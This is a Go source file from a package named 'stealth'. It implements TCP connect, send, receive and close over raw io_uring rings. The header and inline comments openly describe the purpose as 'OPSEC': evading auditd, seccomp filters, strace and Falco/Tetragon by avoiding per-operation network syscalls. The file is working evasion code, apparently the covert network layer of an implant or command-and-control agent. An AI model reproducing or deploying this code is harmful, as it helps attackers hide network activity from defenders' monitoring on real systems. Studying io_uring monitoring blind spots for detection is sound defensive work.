package stealth

// io_uring Stealth I/O — Syscall-Invisible Network Operations
//
// OPSEC rationale: io_uring performs I/O through shared memory ring buffers
// between userspace and kernel. After the initial io_uring_setup() call,
// all operations (connect, send, recv) go through the ring — no per-operation
// syscalls are made. This bypasses:
//
//   - auditd: rules on connect/sendto/recvfrom/read/write never fire
//   - seccomp: BPF filters on network syscalls don't match
//   - strace/ltrace: nothing to trace after setup
//   - Falco/Tetragon: incomplete io_uring coverage in most deployments
//
// Visible artifacts (unavoidable but non-suspicious):
//   - io_uring_setup (syscall 425) — called once at init
//   - io_uring_enter (syscall 426) — called to submit/wait batches
//   - socket() — once per TCP connection (kernel <5.19)
//   - Anonymous mmap regions in /proc/[pid]/maps (normal for io_uring users)
//   - anon_inode:[io_uring] fd in /proc/[pid]/fd/
//
// Kernel requirement: 5.6+ (for IORING_OP_SEND/RECV)

import (
	"encoding/binary"
	"fmt"
	"runtime"
	"sync"
	"sync/atomic"
	"syscall"
	"unsafe"
)

// io_uring syscall numbers (x86_64).
const (
	sysIOUringSetup uintptr = 425
	sysIOUringEnter uintptr = 426
)

// mmap offsets for io_uring memory regions.
const (
	iouOffSQRing int64 = 0
	iouOffCQRing int64 = 0x8000000
	iouOffSQEs   int64 = 0x10000000
)

// io_uring opcodes.
const (
	iouOpNop     uint8 = 0
	iouOpConnect uint8 = 16
	iouOpClose   uint8 = 19
	iouOpSend    uint8 = 26 // kernel 5.6+
	iouOpRecv    uint8 = 27 // kernel 5.6+
)

// io_uring_enter flags.
const (
	iouEnterGetevents uint32 = 1 << 0
	iouEnterSQWakeup  uint32 = 1 << 1
)

// io_uring_setup flags.
const (
	iouSetupSQPoll uint32 = 1 << 1
)

// io_uring feature flags (returned by kernel).
const (
	iouFeatSingleMmap uint32 = 1 << 0
)

// SQE layout (64 bytes).
const (
	iouSQESize     = 64
	iouSQEOpcode   = 0
	iouSQEFlags    = 1
	iouSQEFD       = 4  // int32
	iouSQEOff      = 8  // uint64 (addrlen for connect)
	iouSQEAddr     = 16 // uint64 (pointer to sockaddr/buffer)
	iouSQELen      = 24 // uint32
	iouSQEMsgFlags = 28 // uint32
	iouSQEUserData = 32 // uint64
)

// CQE layout (16 bytes).
const (
	iouCQESize     = 16
	iouCQEUserData = 0 // uint64
	iouCQERes      = 8 // int32
)

// sqRingOff matches the kernel's struct io_sqring_offsets (40 bytes).
type sqRingOff struct {
	Head        uint32
	Tail        uint32
	RingMask    uint32
	RingEntries uint32
	Flags       uint32
	Dropped     uint32
	Array       uint32
	Resv1       uint32
	UserAddr    uint64
}

// cqRingOff matches the kernel's struct io_cqring_offsets (40 bytes).
type cqRingOff struct {
	Head        uint32
	Tail        uint32
	RingMask    uint32
	RingEntries uint32
	Overflow    uint32
	CQEs        uint32
	Flags       uint32
	Resv1       uint32
	UserAddr    uint64
}

// iouParams matches the kernel's struct io_uring_params (120 bytes).
type iouParams struct {
	SQEntries    uint32
	CQEntries    uint32
	Flags        uint32
	SQThreadCPU  uint32
	SQThreadIdle uint32
	Features     uint32
	WQFD         uint32
	Resv         [3]uint32
	SQOff        sqRingOff
	CQOff        cqRingOff
}

// IoUring provides syscall-invisible I/O via the Linux io_uring interface.
type IoUring struct {
	fd int

	// SQ ring
	sqMem  []byte
	sqHead *uint32
	sqTail *uint32
	sqMask uint32
	sqArr  unsafe.Pointer // base of uint32 index array in sqMem
	sqN    uint32

	// SQE array (separate mmap)
	sqesMem []byte

	// CQ ring (may share mmap with SQ if FEAT_SINGLE_MMAP)
	cqMem  []byte
	cqHead *uint32
	cqTail *uint32
	cqMask uint32
	cqBase unsafe.Pointer // base of CQE array in cqMem
	cqN    uint32

	shared bool // SQ and CQ share a single mmap

	mu     sync.Mutex
	nextUD uint64
}

// IoUringConfig controls ring behavior.
type IoUringConfig struct {
	Entries uint32 // SQ entries (power of 2, default 32)
	SQPoll  bool   // SQPOLL mode: kernel thread polls SQ (needs root)
}

// DefaultIoUringConfig returns conservative defaults.
func DefaultIoUringConfig() *IoUringConfig {
	return &IoUringConfig{Entries: 32}
}

// zero buffer for clearing SQEs without allocation.
var iouZeroSQE [iouSQESize]byte

// NewIoUring creates a new io_uring instance.
// After this call, Connect/Send/Recv bypass per-operation syscalls.
func NewIoUring(cfg *IoUringConfig) (*IoUring, error) {
	if cfg == nil {
		cfg = DefaultIoUringConfig()
	}

	var p iouParams
	if cfg.SQPoll {
		p.Flags = iouSetupSQPoll
		p.SQThreadIdle = 10000 // 10s idle before kernel thread sleeps
	}

	fd, _, errno := syscall.Syscall(
		sysIOUringSetup,
		uintptr(cfg.Entries),
		uintptr(unsafe.Pointer(&p)),
		0,
	)
	if errno != 0 {
		return nil, fmt.Errorf("io_uring_setup: %v", errno)
	}

	ring := &IoUring{
		fd:     int(fd),
		sqN:    p.SQEntries,
		cqN:    p.CQEntries,
		shared: p.Features&iouFeatSingleMmap != 0,
	}

	if err := ring.mapRings(&p); err != nil {
		syscall.Close(ring.fd)
		return nil, err
	}

	return ring, nil
}

// mapRings mmaps the SQ ring, CQ ring, and SQE array.
func (r *IoUring) mapRings(p *iouParams) error {
	// SQ ring size: extends to end of the index array
	sqSize := int(p.SQOff.Array + p.SQEntries*4)

	// If SINGLE_MMAP, CQ lives in the same region — use the larger size
	if r.shared {
		cqEnd := int(p.CQOff.CQEs + p.CQEntries*uint32(iouCQESize))
		if cqEnd > sqSize {
			sqSize = cqEnd
		}
	}

	var err error

	// mmap SQ ring (and CQ ring if SINGLE_MMAP)
	r.sqMem, err = syscall.Mmap(r.fd, iouOffSQRing, sqSize,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_SHARED|syscall.MAP_POPULATE)
	if err != nil {
		return fmt.Errorf("mmap sq: %v", err)
	}

	// Resolve SQ ring pointers from the mmaped region
	r.sqHead = (*uint32)(unsafe.Pointer(&r.sqMem[p.SQOff.Head]))
	r.sqTail = (*uint32)(unsafe.Pointer(&r.sqMem[p.SQOff.Tail]))
	r.sqMask = *(*uint32)(unsafe.Pointer(&r.sqMem[p.SQOff.RingMask]))
	r.sqArr = unsafe.Pointer(&r.sqMem[p.SQOff.Array])

	// mmap CQ ring
	if r.shared {
		r.cqMem = r.sqMem
	} else {
		cqSize := int(p.CQOff.CQEs + p.CQEntries*uint32(iouCQESize))
		r.cqMem, err = syscall.Mmap(r.fd, iouOffCQRing, cqSize,
			syscall.PROT_READ|syscall.PROT_WRITE,
			syscall.MAP_SHARED|syscall.MAP_POPULATE)
		if err != nil {
			syscall.Munmap(r.sqMem)
			return fmt.Errorf("mmap cq: %v", err)
		}
	}

	// Resolve CQ ring pointers
	r.cqHead = (*uint32)(unsafe.Pointer(&r.cqMem[p.CQOff.Head]))
	r.cqTail = (*uint32)(unsafe.Pointer(&r.cqMem[p.CQOff.Tail]))
	r.cqMask = *(*uint32)(unsafe.Pointer(&r.cqMem[p.CQOff.RingMask]))
	r.cqBase = unsafe.Pointer(&r.cqMem[p.CQOff.CQEs])

	// mmap SQE array
	sqesSize := int(p.SQEntries) * iouSQESize
	r.sqesMem, err = syscall.Mmap(r.fd, iouOffSQEs, sqesSize,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_SHARED|syscall.MAP_POPULATE)
	if err != nil {
		if !r.shared {
			syscall.Munmap(r.cqMem)
		}
		syscall.Munmap(r.sqMem)
		return fmt.Errorf("mmap sqes: %v", err)
	}

	return nil
}

// Close tears down the io_uring instance and releases all mmaped memory.
func (r *IoUring) Close() {
	if r.sqesMem != nil {
		syscall.Munmap(r.sqesMem)
		r.sqesMem = nil
	}
	if !r.shared && r.cqMem != nil {
		syscall.Munmap(r.cqMem)
	}
	r.cqMem = nil
	if r.sqMem != nil {
		syscall.Munmap(r.sqMem)
		r.sqMem = nil
	}
	if r.fd >= 0 {
		syscall.Close(r.fd)
		r.fd = -1
	}
}

// getSQE returns the next available SQE slot (zeroed) and its ring index.
// Caller must hold r.mu.
func (r *IoUring) getSQE() ([]byte, uint32, error) {
	head := atomic.LoadUint32(r.sqHead)
	tail := atomic.LoadUint32(r.sqTail)
	if tail-head >= r.sqN {
		return nil, 0, fmt.Errorf("io_uring: SQ full")
	}

	idx := tail & r.sqMask
	sqe := r.sqesMem[idx*iouSQESize : (idx+1)*iouSQESize]
	copy(sqe, iouZeroSQE[:])
	return sqe, idx, nil
}

// submitOne publishes an SQE, submits it via io_uring_enter, and waits for the CQE.
// Returns the CQE res field (negative values are -errno).
// Caller must hold r.mu.
func (r *IoUring) submitOne(sqe []byte, idx uint32) (int32, error) {
	// Assign unique user_data for CQE matching
	r.nextUD++
	ud := r.nextUD
	binary.LittleEndian.PutUint64(sqe[iouSQEUserData:], ud)

	// Write SQE index into the SQ array (single-expression pointer arithmetic)
	arrSlot := (*uint32)(unsafe.Pointer(uintptr(r.sqArr) + uintptr(idx)*4))
	*arrSlot = idx

	// Advance SQ tail (atomic store acts as write barrier on x86)
	tail := atomic.LoadUint32(r.sqTail)
	atomic.StoreUint32(r.sqTail, tail+1)

	// Submit 1 SQE and wait for 1 CQE
	_, _, errno := syscall.Syscall6(
		sysIOUringEnter,
		uintptr(r.fd),
		1, // to_submit
		1, // min_complete
		uintptr(iouEnterGetevents),
		0, 0,
	)
	if errno != 0 {
		return 0, fmt.Errorf("io_uring_enter: %v", errno)
	}

	return r.reapCQE(ud)
}

// reapCQE reads the next CQE matching the given user_data.
func (r *IoUring) reapCQE(userData uint64) (int32, error) {
	head := atomic.LoadUint32(r.cqHead)
	tail := atomic.LoadUint32(r.cqTail)

	if head == tail {
		return 0, fmt.Errorf("io_uring: no CQE available")
	}

	cqeIdx := head & r.cqMask
	cqeBytes := (*[iouCQESize]byte)(unsafe.Pointer(uintptr(r.cqBase) + uintptr(cqeIdx)*iouCQESize))

	_ = binary.LittleEndian.Uint64(cqeBytes[iouCQEUserData:]) // user_data
	res := int32(binary.LittleEndian.Uint32(cqeBytes[iouCQERes:]))

	// Advance CQ head
	atomic.StoreUint32(r.cqHead, head+1)

	return res, nil
}

// IouConnect creates a TCP socket and connects via io_uring.
// The socket() syscall is visible, but the connect is NOT — it goes through the ring.
func (r *IoUring) IouConnect(ip4 [4]byte, port uint16) (int, error) {
	// Create TCP socket (one visible syscall — unavoidable on kernel < 5.19)
	sockfd, err := syscall.Socket(
		syscall.AF_INET,
		syscall.SOCK_STREAM|syscall.SOCK_NONBLOCK|syscall.SOCK_CLOEXEC,
		0,
	)
	if err != nil {
		return -1, fmt.Errorf("socket: %v", err)
	}

	// Build sockaddr_in (16 bytes, port in network byte order)
	var addr syscall.RawSockaddrInet4
	addr.Family = syscall.AF_INET
	addr.Port = (port << 8) | (port >> 8) // htons
	addr.Addr = ip4

	r.mu.Lock()
	defer r.mu.Unlock()

	sqe, idx, err := r.getSQE()
	if err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	// Fill SQE: IORING_OP_CONNECT
	sqe[iouSQEOpcode] = iouOpConnect
	binary.LittleEndian.PutUint32(sqe[iouSQEFD:], uint32(int32(sockfd)))
	binary.LittleEndian.PutUint64(sqe[iouSQEAddr:], uint64(uintptr(unsafe.Pointer(&addr))))
	binary.LittleEndian.PutUint64(sqe[iouSQEOff:], uint64(unsafe.Sizeof(addr)))

	res, err := r.submitOne(sqe, idx)
	runtime.KeepAlive(addr) // prevent GC during async kernel op
	if err != nil {
		syscall.Close(sockfd)
		return -1, err
	}

	if res < 0 {
		syscall.Close(sockfd)
		return -1, fmt.Errorf("connect: %v", syscall.Errno(-res))
	}

	return sockfd, nil
}

// IouSend sends data on a connected socket via io_uring.
// No sendto/send/write syscall is made — invisible to auditd/seccomp.
func (r *IoUring) IouSend(fd int, data []byte) (int, error) {
	if len(data) == 0 {
		return 0, nil
	}

	r.mu.Lock()
	defer r.mu.Unlock()

	sqe, idx, err := r.getSQE()
	if err != nil {
		return 0, err
	}

	sqe[iouSQEOpcode] = iouOpSend
	binary.LittleEndian.PutUint32(sqe[iouSQEFD:], uint32(int32(fd)))
	binary.LittleEndian.PutUint64(sqe[iouSQEAddr:], uint64(uintptr(unsafe.Pointer(&data[0]))))
	binary.LittleEndian.PutUint32(sqe[iouSQELen:], uint32(len(data)))

	res, err := r.submitOne(sqe, idx)
	runtime.KeepAlive(data)
	if err != nil {
		return 0, err
	}

	if res < 0 {
		return 0, fmt.Errorf("send: %v", syscall.Errno(-res))
	}

	return int(res), nil
}

// IouRecv receives data from a connected socket via io_uring.
// No recvfrom/recv/read syscall is made — invisible to auditd/seccomp.
func (r *IoUring) IouRecv(fd int, buf []byte) (int, error) {
	if len(buf) == 0 {
		return 0, nil
	}

	r.mu.Lock()
	defer r.mu.Unlock()

	sqe, idx, err := r.getSQE()
	if err != nil {
		return 0, err
	}

	sqe[iouSQEOpcode] = iouOpRecv
	binary.LittleEndian.PutUint32(sqe[iouSQEFD:], uint32(int32(fd)))
	binary.LittleEndian.PutUint64(sqe[iouSQEAddr:], uint64(uintptr(unsafe.Pointer(&buf[0]))))
	binary.LittleEndian.PutUint32(sqe[iouSQELen:], uint32(len(buf)))

	res, err := r.submitOne(sqe, idx)
	runtime.KeepAlive(buf)
	if err != nil {
		return 0, err
	}

	if res < 0 {
		return 0, fmt.Errorf("recv: %v", syscall.Errno(-res))
	}

	return int(res), nil
}

// IouCloseFD closes a file descriptor via io_uring.
func (r *IoUring) IouCloseFD(fd int) error {
	r.mu.Lock()
	defer r.mu.Unlock()

	sqe, idx, err := r.getSQE()
	if err != nil {
		return err
	}

	sqe[iouSQEOpcode] = iouOpClose
	binary.LittleEndian.PutUint32(sqe[iouSQEFD:], uint32(int32(fd)))

	res, err := r.submitOne(sqe, idx)
	if err != nil {
		return err
	}

	if res < 0 {
		return fmt.Errorf("close: %v", syscall.Errno(-res))
	}

	return nil
}

// IouSendAll sends all data, looping until the full buffer is transmitted.
func (r *IoUring) IouSendAll(fd int, data []byte) error {
	for len(data) > 0 {
		n, err := r.IouSend(fd, data)
		if err != nil {
			return err
		}
		data = data[n:]
	}
	return nil
}

// IouSendRecv performs a full request-response cycle over io_uring.
// Sends req, then receives up to maxResp bytes of response.
func (r *IoUring) IouSendRecv(fd int, req []byte, maxResp int) ([]byte, error) {
	if err := r.IouSendAll(fd, req); err != nil {
		return nil, fmt.Errorf("send: %w", err)
	}

	buf := make([]byte, maxResp)
	n, err := r.IouRecv(fd, buf)
	if err != nil {
		return nil, fmt.Errorf("recv: %w", err)
	}

	return buf[:n], nil
}

// IoUringAvailable checks if io_uring is supported on this kernel.
// Performs a lightweight probe: setup with 1 entry, then immediately close.
func IoUringAvailable() bool {
	var p iouParams
	fd, _, errno := syscall.Syscall(
		sysIOUringSetup,
		1,
		uintptr(unsafe.Pointer(&p)),
		0,
	)
	if errno != 0 {
		return false
	}
	syscall.Close(int(fd))
	return true
}
